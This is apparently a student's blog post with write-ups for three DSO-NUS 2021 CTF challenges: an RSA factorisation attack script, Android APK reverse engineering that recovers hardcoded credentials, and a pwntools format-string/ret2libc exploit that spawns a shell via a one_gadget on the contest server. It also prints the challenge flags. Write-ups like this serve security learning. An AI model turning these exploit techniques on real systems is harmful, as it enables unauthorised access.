I"%d<p>The DSO-NUS CTF was my first local competition of 2021 :).</p>

<p>I had honestly expected that I would not solve any challenges, seeing as to how this CTF was also targeted at <strong>University</strong> students rather than the <strong>Junior College/ITE</strong> categories that I was so used to.</p>

<p>However, my teammate and I managed to pull through and clinch 10th place!</p>

<p><img src="/assets/Images/DSO-NUS-ctf/results.png" alt="" />
<img src="/assets/Images/DSO-NUS-ctf/solves.png" alt="" /></p>

<h1 id="writeups">Writeups</h1>
<p>Also, I made writeups the following challenges:</p>
<ol>
  <li><a href="#protect-the-vaccine">(Crypto) Protect The Vaccine</a></li>
  <li><a href="#login">(Mobile) Login</a></li>
  <li><a href="#robust-orbital-postal-service">(Pwn) Robust Orbital Postal Service</a></li>
</ol>

<h2 id="protect-the-vaccine">Protect The Vaccine</h2>
<p><code class="language-plaintext highlighter-rouge">A nation-supported hacker group is using their cutting edge technology to attack a company that develops vaccine. They roll their own crypto with a hope that it will be more secure. Luckily, we have got some of their crypto system information and also have found some research that is likely to break their crypto system. I heard you are a cipher breaker, could you help us to decrypt their secret and protect the vaccine from their plan?</code></p>

<h3 id="reconnaissance">Reconnaissance</h3>
<p>We are given the 2020 paper by Amir Hamzah, Mhd. Rezal, and Mhd. Azraf, <a href="https://www.mdpi.com/2073-8994/12/5/838">A New LSB Attack on Special-Structured RSA Primes</a>, and an encryptor file as below:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">config</span> <span class="kn">import</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">m</span><span class="p">,</span><span class="n">r_p</span><span class="p">,</span><span class="n">r_q</span><span class="p">,</span><span class="n">secret</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">a</span><span class="o">**</span><span class="n">m</span> <span class="o">+</span> <span class="n">r_p</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">b</span><span class="o">**</span><span class="n">m</span> <span class="o">+</span> <span class="n">r_q</span>
<span class="n">N</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>

<span class="n">M</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">'N:'</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'e:'</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'r_p:'</span><span class="p">,</span> <span class="n">r_p</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'r_q:'</span><span class="p">,</span> <span class="n">r_q</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'c:'</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
</code></pre></div></div>

<p>The paper itself describes an attack on <strong>primes of the special form <img src="https://render.githubusercontent.com/render/math?math=$n^{m}%2Br$" alt="" /></strong>, where <code class="language-plaintext highlighter-rouge">n,m,r</code> are secret integers.</p>

<p>Ostensibly this is of the same form as the primes p and q in this challenge.</p>

<p><strong>At this point I heaved a protracted sigh of disappointment, deflating and slouching upon my chair as a leaky balloon prostrates upon the floor.</strong></p>

<p><strong>If Uncle Roger were here he would put down his leg. H A I Y A A.</strong></p>

<h3 id="on-the-challenge-itself">On The Challenge Itself</h3>

<p>It should be painfully obvious that whoever made this challenge simply wanted us to implement the attack.</p>

<p>The proofs and conceptual framework are thus insignificant. It is a nice paper though.</p>

<p>Below is a brief explanation of the attack:</p>
<ol>
  <li>Compute $i=\lceil%20r_{p}r_{q}%20\rceil$ <img src="https://render.githubusercontent.com/render/math?math=$i=\lceil%20r_{p}r_{q}%20\rceil$" alt="" />.</li>
  <li>Thus compute <img src="https://render.githubusercontent.com/render/math?math=$\sigma%20=%20(\lceil%20\sqrt{N}%20\rceil%20-%20i)^{2}$" alt="" /> and <img src="https://render.githubusercontent.com/render/math?math=$\z%20\equiv%20N-(r_{p}r_{q})%20\pmod%20\sigma$" alt="" />.</li>
  <li>Then solve the quadratic equation <img src="https://render.githubusercontent.com/render/math?math=$X^{2}-zX%2B\sigma%20r_{p}r_{q}=0$" alt="" />.</li>
  <li>So compute <img src="https://render.githubusercontent.com/render/math?math=$p=\frac{x_{1}}{r_{q}}%2Br_{p}$" alt="" />, and <img src="https://render.githubusercontent.com/render/math?math=$q=\frac{x_{1}}{r_{p}}%2Br_{q}$" alt="" /></li>
  <li>If you do not get integer solutions for <code class="language-plaintext highlighter-rouge">p</code> and <code class="language-plaintext highlighter-rouge">q</code>, increment <code class="language-plaintext highlighter-rouge">i</code> and go to step 2.</li>
  <li>Otherwise, you have factorized <code class="language-plaintext highlighter-rouge">p</code> and <code class="language-plaintext highlighter-rouge">q</code>.</li>
</ol>

<p>There really is no need to explain anything else. Let’s claim our flag and walk away in dejection…</p>

<h3 id="the-script--the-flag">The Script &amp; The Flag</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
<span class="n">N</span><span class="o">=</span><span class="mi">3275733051034358984052873301763419226982953208866734590577442123100212241755791923555521543209801099055699081707325573295107810120279016450478569963727745375599027892100123044479660797401966572267597729137245240398252709789403914717981992805267568330238483858915840720285089128695716116366797390222336632152162599116524881401005018469215424916742801818134711336300828503706379381178900753467864554260446708842162773345348298157467411926079756092147544497068000233007477191578333572784654318537785544709699328915760518608291118807464400785836835778315009377442766842129158923286952014836265426233094717963075689446543</span>
<span class="n">e</span><span class="o">=</span><span class="mi">65537</span>
<span class="n">r_p</span><span class="o">=</span><span class="mi">5555</span>
<span class="n">r_q</span><span class="o">=</span><span class="mi">2021</span>
<span class="n">c</span><span class="o">=</span><span class="mi">1556192154031991594732510705883546583096229743096303430901374706824505750761088363281890335979653013911714293502545423757924361475736093242401222947901355869932133190452403616496603786871994754637823336368216836022953863014593342644392369877974990401809731572974216127814977558172171864993498081681595043521251475276813852699339208084848504200274031750249400405999547189108618939914820295837292164648879085448065561197691023430722069818332742153760012768834458654303088057879612122947985115227503445210002797443447539212535515235045439442675101339926607807561016634838677881127459579466831387538801957970278441177712</span>

<span class="c1"># I believe all you need to do is follow the instructions...
</span><span class="n">i</span><span class="o">=</span><span class="n">ceil</span><span class="p">(</span><span class="n">sqrt</span><span class="p">(</span><span class="n">r_p</span><span class="o">*</span><span class="n">r_q</span><span class="p">))</span>

<span class="n">factorized</span><span class="o">=</span><span class="bp">False</span>
<span class="k">while</span> <span class="ow">not</span> <span class="n">factorized</span><span class="p">:</span>
    <span class="n">sigma</span><span class="o">=</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">sqrt</span><span class="p">(</span><span class="n">N</span><span class="p">))</span><span class="o">-</span><span class="n">i</span><span class="p">)</span><span class="o">**</span><span class="mi">2</span>
    <span class="n">z</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">Mod</span><span class="p">(</span><span class="n">N</span><span class="o">-</span><span class="n">r_p</span><span class="o">*</span><span class="n">r_q</span><span class="p">,</span><span class="n">sigma</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="n">x</span><span class="o">=</span><span class="n">var</span><span class="p">(</span><span class="s">'x'</span><span class="p">)</span>
    <span class="n">S</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">2</span><span class="o">-</span><span class="n">z</span><span class="o">*</span><span class="n">x</span><span class="o">+</span><span class="n">sigma</span><span class="o">*</span><span class="n">r_p</span><span class="o">*</span><span class="n">r_q</span><span class="o">==</span><span class="mi">0</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">solution_dict</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">soln</span> <span class="ow">in</span> <span class="n">S</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">soln</span><span class="p">[</span><span class="n">x</span><span class="p">].</span><span class="n">is_integer</span><span class="p">():</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"No solution :((("</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Got Solution! </span><span class="si">{</span><span class="n">soln</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="n">factorized</span><span class="o">=</span><span class="bp">True</span>
    <span class="n">i</span><span class="o">+=</span><span class="mi">1</span>
<span class="c1"># Turns out we got lucky. At i=3379 we receive
</span><span class="n">x1</span><span class="o">=</span><span class="mi">168200524686562144694620288802920098491216735170837810125672320002939647866974222365012727452940769281308849288903115688589419797624616813460735137583543839726240553545302460214475263890124428240711467804365871217554755973866852861234743770756153485545678683848833029401921482153203747584834969282377159947080780</span>
<span class="n">x2</span><span class="o">=</span><span class="mi">218640963841168131005470550035379468161157139960153907690360606758392731649074205802111908622011434335143690091387592220823296028451227124397192393817824166806698902839833001318765091590325160563899341911850960055105827530299680127408632836041078255714159019688574965424438294715765508204336190307241026142672404</span>

<span class="n">q</span><span class="o">=</span><span class="p">(</span><span class="n">x1</span><span class="o">/</span><span class="n">r_p</span><span class="p">)</span><span class="o">+</span><span class="n">r_q</span>
<span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="n">x2</span><span class="o">/</span><span class="n">r_q</span><span class="p">)</span><span class="o">+</span><span class="n">r_p</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">*</span><span class="n">q</span><span class="o">==</span><span class="n">N</span><span class="p">)</span>

<span class="n">totient</span><span class="o">=</span><span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">d</span><span class="o">=</span><span class="n">inverse_mod</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">totient</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">N</span><span class="p">)))</span>
</code></pre></div></div>

<p>And thus we receive the flag:</p>

<p><code class="language-plaintext highlighter-rouge">Let's meet at Yichun on 30 Feb. On that day, say 'DSO-NUS{851f6c328f2da456cbc410184c7ada365c6d1f69199f0f4fdcb9fd43101ce9ee}' to confirm your identity.</code></p>

<h2 id="login">Login</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>It's time for a simple, relaxing challenge.
Can you find the correct credentials?
</code></pre></div></div>

<p>This was my first foray into Mobile RE. It was rather painful but at least I learnt more about dissecting Android applications.</p>

<h3 id="reconnaissance-1">Reconnaissance</h3>

<p>We are presented with an APK file which reveals some interesting code:</p>

<p><img src="/assets/Images/DSO-NUS-ctf/mobile_login/ddea.png" alt="" />
<img src="/assets/Images/DSO-NUS-ctf/mobile_login/m_userid.png" alt="" />
<img src="/assets/Images/DSO-NUS-ctf/mobile_login/m_password.png" alt="" />
<img src="/assets/Images/DSO-NUS-ctf/mobile_login/checks.png" alt="" />
<img src="/assets/Images/DSO-NUS-ctf/mobile_login/javapassword.png" alt="" />
<img src="/assets/Images/DSO-NUS-ctf/mobile_login/aestool.png" alt="" /></p>

<p>All from LoginDataSource.java and AESTools.java. The rest were… junk, to say the least.</p>

<h3 id="making-sense-of-everything">Making Sense of Everything.</h3>
<p>We seem to need to recover 3 things:</p>
<ul>
  <li>The <code class="language-plaintext highlighter-rouge">user ID</code></li>
  <li>The first 4 characters of the <code class="language-plaintext highlighter-rouge">password</code></li>
  <li>The last 8 characters of the <code class="language-plaintext highlighter-rouge">password</code>.</li>
</ul>

<p>The first two are relatively trivial.</p>

<p><img src="/assets/Images/DSO-NUS-ctf/mobile_login/userid.png" alt="" />
<img src="/assets/Images/DSO-NUS-ctf/mobile_login/first4.png" alt="" /></p>

<p>The only troublesome one was the <code class="language-plaintext highlighter-rouge">getNativePassword()</code> function.</p>

<p>However, upon following, we noticed that there was this <code class="language-plaintext highlighter-rouge">ddea.so</code> file (4 different binaries, we selected the ARM 64-bit one). Opening it gives us:</p>

<p><img src="/assets/Images/DSO-NUS-ctf/mobile_login/getnativepassword.png" alt="" /></p>

<p>which… OK, it is what we want but…
It is pretty intimidating.</p>

<p>That is… if you <strong>don’t</strong> look at the program graph.</p>

<p><img src="/assets/Images/DSO-NUS-ctf/mobile_login/xor.png" alt="" /></p>

<p>It is evident that each and every byte is being xorred, from <code class="language-plaintext highlighter-rouge">byte_8F0</code> and <code class="language-plaintext highlighter-rouge">byte_901</code> to <code class="language-plaintext highlighter-rouge">byte_8FF</code> and <code class="language-plaintext highlighter-rouge">byte_910</code>.
This will give us the key.
(Sorry ;^; the screen was way too long)</p>

<p>So let us see if we can xor them together…</p>

<p><img src="/assets/Images/DSO-NUS-ctf/mobile_login/recoverkey.png" alt="" /></p>

<p>Bingo.
Thus we decrypt the AES ciphertext as:</p>

<p><img src="/assets/Images/DSO-NUS-ctf/mobile_login/decrypt.png" alt="" /></p>

<p>Thus we submit</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: User1337
Password: L1v3p2Zzw0rD
</code></pre></div></div>

<p>And receive the flag:</p>

<p><code class="language-plaintext highlighter-rouge">DSO-NUS{71bcade1b51d529ad5c9d23657662901a4be6eb7296c76fecee1e892a2d8af3e}</code></p>

<h2 id="robust-orbital-postal-service">Robust Orbital Postal Service</h2>
<p><code class="language-plaintext highlighter-rouge">You managed to break into another one of the imposter's communication system, named the Robust Orbital Postal Service. This service lets the imposters send messages to one another secretly. Are you able to find out about their secrets?</code></p>

<h3 id="reconnaissance-2">Reconnaissance</h3>
<p>Doing the things that we should do in Pwn:</p>

<p><img src="/assets/Images/DSO-NUS-ctf/pwn_ROPS/checksec.png" alt="" />
<img src="/assets/Images/DSO-NUS-ctf/pwn_ROPS/ida.png" alt="" /></p>

<p>Also, note that we have a LIBC file:</p>

<p><img src="/assets/Images/DSO-NUS-ctf/pwn_ROPS/libc.png" alt="" /></p>
<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">printf()</code> without <em>format strings</em> means a <strong>Format String Exploit.</strong></li>
  <li>Unlike the previous FSBS challenge, there is no <code class="language-plaintext highlighter-rouge">getflag()</code> function.
    <ul>
      <li>Unfortunately, there is <em>NX bit</em> up.</li>
      <li>So it has to be a <strong>ret2libc</strong> exploit (at least, that’s what I assumed or this challenge would have been out of my capacity).
        <ul>
          <li>This is also reasonable considering we are given a <code class="language-plaintext highlighter-rouge">custom libc version</code>.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>PIE implies the need to leak PIE base… or do we?</li>
</ul>

<p><strong>Verdict: ret2libc</strong></p>

<h3 id="the-15-min-exploit-refer-to-script">The 15-min Exploit. (Refer to Script)</h3>
<p>ret2libc attacks (that I know of) primarily concern themselves with exploiting <code class="language-plaintext highlighter-rouge">one_gadgets</code>, which spawns a shell so long as the constraints are met.</p>

<p>So we will be looking for <code class="language-plaintext highlighter-rouge">libc offsets</code> to jump into the <code class="language-plaintext highlighter-rouge">one_gadget</code>:</p>

<p><img src="/assets/Images/DSO-NUS-ctf/pwn_ROPS/libc-offset.png" alt="" /></p>

<p>And the <code class="language-plaintext highlighter-rouge">one_gadget</code> itself:
<img src="/assets/Images/DSO-NUS-ctf/pwn_ROPS/onegadget.png" alt="" /></p>

<p>Then, we simply perform your standard ret2libc exploit routine:</p>

<ol>
  <li>Leak <code class="language-plaintext highlighter-rouge">libc base</code> with a known <code class="language-plaintext highlighter-rouge">libc</code> function:</li>
</ol>

<p><img src="/assets/Images/DSO-NUS-ctf/pwn_ROPS/libcleak.png" alt="" /></p>

<p>We are using the <strong>Format String Exploit</strong> from the previous challenge (FSBS).</p>

<p><img src="/assets/Images/DSO-NUS-ctf/pwn_ROPS/libc-offset.png" alt="" /></p>

<p>Then we look up the custom LIBC offset using LIBC-database.</p>

<p>In this case, our dear address is given by this line in our script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">libc_base</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">243</span><span class="o">-</span><span class="mh">0x236c0</span>
<span class="c1"># Subject to change, of course, due to PIE.
</span></code></pre></div></div>

<ol>
  <li>Find our one_gadget address.</li>
</ol>

<p>This… requires no explanation. Just use <code class="language-plaintext highlighter-rouge">one_gadget</code>.
<img src="/assets/Images/DSO-NUS-ctf/pwn_ROPS/onegadget.png" alt="" /></p>

<p>I used the first one.</p>

<ol>
  <li>Lastly, <strong>clear all constraints</strong> as stipulated and jump to the <code class="language-plaintext highlighter-rouge">one_gadget</code>.</li>
</ol>

<p>Because we are using <code class="language-plaintext highlighter-rouge">rax</code>, we can simply terminate the input string (<code class="language-plaintext highlighter-rouge">'\0'</code>) to reset it to <code class="language-plaintext highlighter-rouge">NULL</code>.</p>

<p>And just like that we clear our constraints!
We spare you the pain of looking at us connect to the server and thus we retrieve the flag:</p>

<p><code class="language-plaintext highlighter-rouge">DSO-NUS{13514e093f9b3c56ed27bad097ea810b27c1e754b7de98d6ff8bc3006f5ab82d}</code></p>

<h3 id="appendix-the-script">Appendix: The Script</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="s">'DEBUG'</span>
<span class="c1">#r=process(["./ROPS"],env={"LD_PRELOAD": "libc.so.6"})
</span><span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"ctf-jfi4.balancedcompo.site"</span><span class="p">,</span><span class="mi">9995</span><span class="p">)</span>
<span class="c1"># ROPS.so.6 in libcdatabase: local-f6cb23f4bb2899adab95d11fc2e5eba3ed1c3266
</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s">'/usr/bin/tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"name:"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%19$p"</span><span class="p">)</span> <span class="c1"># This time we want a LIBC address whose offset we can find. This one has offset 243.
</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"to:"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">libc_base</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mi">243</span><span class="o">-</span><span class="mh">0x236c0</span>
<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="c1">#pause()
</span><span class="n">one_gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x44b9f</span>
<span class="c1"># Three candidates. Depends on the gadgets you can find. I'll try the first one...
# 0x44b9f - requires rax==0
# 0x44bf3 - requires [rsp+0x30]==0
# 0xe85c6 - requires [rsp+0x60]==0
</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="o">+</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">263</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span> <span class="c1"># Offset is again found at 264.
</span><span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>
:ET